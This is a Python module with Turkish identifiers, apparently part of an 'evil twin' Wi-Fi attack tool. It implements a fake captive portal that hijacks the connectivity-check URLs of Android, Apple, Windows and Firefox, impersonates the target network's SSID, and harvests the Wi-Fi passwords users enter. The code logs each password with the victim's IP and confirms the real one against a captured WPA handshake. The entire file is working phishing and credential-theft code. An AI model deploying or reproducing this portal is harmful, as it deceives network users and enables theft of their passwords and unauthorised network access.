#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""captive portal modülü."""

from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
from urllib.parse import urlparse, parse_qs
import os
import datetime

from .yapilandirma import Renkler


class CaptivePortal:
    """captive portal sunucu sınıfı."""

    def __init__(self, sunucu_ip='10.0.0.1', port=80, hedef_ssid=None,
                 handshake_yakalayici=None, dogrulama_callback=None):
        """captive portalı başlatır."""
        self.sunucu_ip = sunucu_ip
        self.port = port
        self.sunucu = None
        self.sunucu_ipligi = None
        self.aktif = False
        self.yakalanan_bilgiler = []
        self.hedef_ssid = hedef_ssid or "WiFi Ağı"
        self.handshake_yakalayici = handshake_yakalayici
        self.dogrulama_callback = dogrulama_callback

        # şifre doğrulama durumu
        self.sifre_dogrulandi = False
        self.dogrulanan_sifre = None
        self._sifre_dogrulama_event = threading.Event()

        self.sablon_dizini = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            'sablonlar'
        )

        # kayıt dizini
        self.kayit_dizini = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            'kayitlar'
        )
        if not os.path.exists(self.kayit_dizini):
            os.makedirs(self.kayit_dizini)

    class PortalIsleyici(BaseHTTPRequestHandler):
        """captive portal istek işleyicisi."""

        # captive portal algılama adresleri
        CAPTIVE_DETECTION_YOLLARI = (
            '/generate_204',           # android
            '/gen_204',                # android
            '/hotspot-detect.html',    # ios / macos
            '/library/test/success.html',  # ios
            '/connecttest.txt',        # windows
            '/ncsi.txt',               # windows
            '/redirect',               # firefox
            '/canonical.html',         # firefox
            '/success.txt',            # android
        )

        def do_GET(self):
            """get isteklerini işler."""
            # url parametrelerini ayrıştır
            parsed = urlparse(self.path)
            yol = parsed.path.rstrip('/')
            params = parse_qs(parsed.query)

            portal_ip = self.server.portal.sunucu_ip

            # captive portal algılama yönlendirmesi
            if yol in self.CAPTIVE_DETECTION_YOLLARI:
                self.send_response(302)
                self.send_header('Location', 'http://{}/'.format(portal_ip))
                self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                self.send_header('Content-Length', '0')
                self.end_headers()
                return

            # portala yönlendir
            if yol != '' and yol != '/' and 'hata' not in self.path:
                self.send_response(302)
                self.send_header('Location', 'http://{}/'.format(portal_ip))
                self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                self.send_header('Content-Length', '0')
                self.end_headers()
                return

            hata_var = 'hata' in params

            sablon_yolu = os.path.join(
                self.server.portal.sablon_dizini, 'giris.html'
            )

            try:
                with open(sablon_yolu, 'r', encoding='utf-8') as dosya:
                    icerik = dosya.read()

                # ssid'yi yerleştir
                icerik = icerik.replace('{ssid}', self.server.portal.hedef_ssid)

                # hata durumunu yerleştir
                if hata_var:
                    icerik = icerik.replace('{hata_sinifi}', 'goster')
                else:
                    icerik = icerik.replace('{hata_sinifi}', '')

                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                self.end_headers()
                self.wfile.write(icerik.encode('utf-8'))
            except FileNotFoundError:
                self.send_response(500)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
                hata_mesaji = '<html><body><h1>sunucu hatası</h1></body></html>'
                self.wfile.write(hata_mesaji.encode('utf-8'))

        def do_POST(self):
            """post isteklerini işler."""
            # form verilerini oku
            try:
                icerik_uzunlugu = int(self.headers.get('Content-Length', 0))
                if icerik_uzunlugu > 65536:
                    icerik_uzunlugu = 65536
                raw_data = self.rfile.read(icerik_uzunlugu)
                post_verisi = raw_data.decode('utf-8', errors='replace')
                form_verileri = parse_qs(post_verisi)
            except Exception:
                form_verileri = {}

            # wifi şifresini al
            wifi_sifre = ''
            if 'wifi_sifre' in form_verileri:
                wifi_sifre = form_verileri['wifi_sifre'][0] if form_verileri['wifi_sifre'] else ''

            # istemci bilgileri
            bilgiler = {
                'wifi_sifre': wifi_sifre,
                'zaman': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'istemci_ip': self.client_address[0],
            }

            # yakalanan bilgilere ekle
            self.server.portal.yakalanan_bilgiler.append(bilgiler)

            # kayıt dosyasına yaz
            self.server.portal.kayit_dosyasina_yaz(bilgiler)

            # bilgileri ekrana yazdır
            print("\n{}[+] yeni şifre denemesi yakalandı!{}".format(
                Renkler.YESIL, Renkler.SIFIRLA
            ))
            print("    {}şifre{}: {}".format(
                Renkler.SARI, Renkler.SIFIRLA, wifi_sifre
            ))
            print("    {}istemci{}: {}".format(
                Renkler.SARI, Renkler.SIFIRLA, self.client_address[0]
            ))

            # handshake doğrulaması
            sifre_dogru = False
            portal = self.server.portal

            if portal.handshake_yakalayici and wifi_sifre:
                print("    {}[*] hash ile doğrulanıyor...{}".format(
                    Renkler.SARI, Renkler.SIFIRLA
                ))
                sifre_dogru = portal.handshake_yakalayici.sifre_dogrula(wifi_sifre)

                if sifre_dogru:
                    bilgiler['dogrulama'] = 'DOĞRU ✓'
                    print("\n    {}{}[✓✓✓] ŞİFRE DOĞRU! → {}{}".format(
                        Renkler.KALIN, Renkler.YESIL, wifi_sifre, Renkler.SIFIRLA
                    ))

                    # doğru şifreyi kaydet
                    portal.sifre_dogrulandi = True
                    portal.dogrulanan_sifre = wifi_sifre
                    portal._sifre_dogrulama_event.set()
                    portal._bulunan_sifre_kaydet(wifi_sifre)

                    # callback fonksiyonunu çağır
                    if portal.dogrulama_callback:
                        try:
                            portal.dogrulama_callback(wifi_sifre)
                        except Exception:
                            pass
                else:
                    bilgiler['dogrulama'] = 'YANLIŞ ✗'
                    print("    {}[✗] şifre yanlış. bekleniyor...{}".format(
                        Renkler.KIRMIZI, Renkler.SIFIRLA
                    ))
            else:
                # handshake yoksa kabul et
                sifre_dogru = True
                portal.sifre_dogrulandi = True
                portal.dogrulanan_sifre = wifi_sifre
                portal._sifre_dogrulama_event.set()

            if sifre_dogru:
                # başarılı sayfasını sun
                sablon_yolu = os.path.join(
                    portal.sablon_dizini, 'basarili.html'
                )

                try:
                    with open(sablon_yolu, 'r', encoding='utf-8') as dosya:
                        icerik = dosya.read()

                    # ssid'yi yerleştir
                    icerik = icerik.replace('{ssid}', portal.hedef_ssid)

                    self.send_response(200)
                    self.send_header('Content-type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(icerik.encode('utf-8'))
                except FileNotFoundError:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html; charset=utf-8')
                    self.end_headers()
                    basari_mesaji = '<html><body><h1>bağlantı başarılı</h1></body></html>'
                    self.wfile.write(basari_mesaji.encode('utf-8'))
            else:
                # yanlış şifre yönlendirmesi
                self.send_response(302)
                self.send_header('Location', '/?hata=1')
                self.end_headers()

        def log_message(self, fmt, *args):
            """http log mesajlarını susturur."""
            pass

    def baslat(self):
        """captive portal sunucusunu başlatır."""
        if self.aktif:
            print("{}[!] captive portal zaten çalışıyor{}".format(
                Renkler.SARI, Renkler.SIFIRLA
            ))
            return False

        try:
            HTTPServer.allow_reuse_address = True
            # dinleme soketini ayarla
            self.sunucu = HTTPServer(
                ('0.0.0.0', self.port),
                self.PortalIsleyici
            )
            # portal referansını bağla
            self.sunucu.portal = self

            self.sunucu_ipligi = threading.Thread(
                target=self.sunucu.serve_forever,
                daemon=True
            )
            self.sunucu_ipligi.start()
            self.aktif = True

            print("{}[+] captive portal başlatıldı: http://{}:{}{}".format(
                Renkler.YESIL, self.sunucu_ip, self.port, Renkler.SIFIRLA
            ))
            return True
        except OSError as hata:
            print("{}[!] captive portal başlatılamadı: {}{}".format(
                Renkler.KIRMIZI, hata, Renkler.SIFIRLA
            ))
            return False

    def durdur(self):
        """captive portal sunucusunu durdurur."""
        if self.sunucu is not None:
            self.sunucu.shutdown()
            try:
                self.sunucu.server_close()
            except Exception:
                pass
            self.sunucu = None
            self.aktif = False
            print("{}[*] captive portal durduruldu{}".format(
                Renkler.MAVI, Renkler.SIFIRLA
            ))

    def sifre_dogrulama_bekle(self, zaman_asimi=None):
        """şifre doğrulanana kadar bekler."""
        dogrulandi = self._sifre_dogrulama_event.wait(timeout=zaman_asimi)
        if dogrulandi:
            return self.dogrulanan_sifre
        return None

    def kayit_dosyasina_yaz(self, bilgiler):
        """yakalanan bilgileri dosyaya yazar."""
        kayit_dosyasi = os.path.join(self.kayit_dizini, 'yakalanan_bilgiler.txt')

        try:
            with open(kayit_dosyasi, 'a', encoding='utf-8') as dosya:
                dosya.write("=" * 50 + "\n")
                dosya.write("tarih: {}\n".format(
                    bilgiler.get('zaman', datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
                ))
                dosya.write("istemci ip: {}\n".format(
                    bilgiler.get('istemci_ip', 'bilinmiyor')
                ))
                for anahtar, deger in bilgiler.items():
                    if anahtar not in ('zaman', 'istemci_ip'):
                        dosya.write("{}: {}\n".format(anahtar, deger))
                dosya.write("=" * 50 + "\n\n")
        except IOError as hata:
            print("{}[!] kayıt dosyasına yazılamadı: {}{}".format(
                Renkler.KIRMIZI, hata, Renkler.SIFIRLA
            ))

    def _bulunan_sifre_kaydet(self, sifre):
        """doğrulanan şifreyi dosyaya kaydeder."""
        kayit_dosyasi = os.path.join(self.kayit_dizini, 'bulunan_sifreler.txt')

        try:
            with open(kayit_dosyasi, 'a', encoding='utf-8') as dosya:
                dosya.write("=" * 50 + "\n")
                dosya.write("tarih    : {}\n".format(
                    datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                ))
                dosya.write("ağ adı   : {}\n".format(self.hedef_ssid))
                dosya.write("şifre    : {}\n".format(sifre))
                dosya.write("doğrulama: handshake hash ile doğrulandı ✓\n")
                dosya.write("=" * 50 + "\n\n")
        except IOError as hata:
            print("{}[!] şifre kayıt dosyasına yazılamadı: {}{}".format(
                Renkler.KIRMIZI, hata, Renkler.SIFIRLA
            ))

    def yakalanan_bilgileri_goster(self):
        """yakalanan bilgileri ekranda gösterir."""
        if not self.yakalanan_bilgiler:
            print("{}[*] henüz yakalanan bilgi yok{}".format(
                Renkler.SARI, Renkler.SIFIRLA
            ))
            return

        print("\n{}╔══════════════════════════════════════════════════════╗{}".format(
            Renkler.MAVI, Renkler.SIFIRLA
        ))
        print("{}║           yakalanan bilgiler ({} adet)               ║{}".format(
            Renkler.MAVI, len(self.yakalanan_bilgiler), Renkler.SIFIRLA
        ))
        print("{}╚══════════════════════════════════════════════════════╝{}".format(
            Renkler.MAVI, Renkler.SIFIRLA
        ))

        for indeks, bilgi in enumerate(self.yakalanan_bilgiler, 1):
            print("\n{}--- kayıt #{} ---{}".format(
                Renkler.SARI, indeks, Renkler.SIFIRLA
            ))
            for anahtar, deger in bilgi.items():
                # doğrulama durumuna göre renklendir
                if anahtar == 'dogrulama':
                    if 'DOĞRU' in str(deger):
                        deger_renk = Renkler.YESIL
                    else:
                        deger_renk = Renkler.KIRMIZI
                else:
                    deger_renk = Renkler.BEYAZ

                print("  {}{:<15}{}: {}{}{}".format(
                    Renkler.YESIL, anahtar, Renkler.SIFIRLA,
                    deger_renk, deger, Renkler.SIFIRLA
                ))

        print("\n{}{}{}".format(Renkler.MAVI, "=" * 50, Renkler.SIFIRLA))
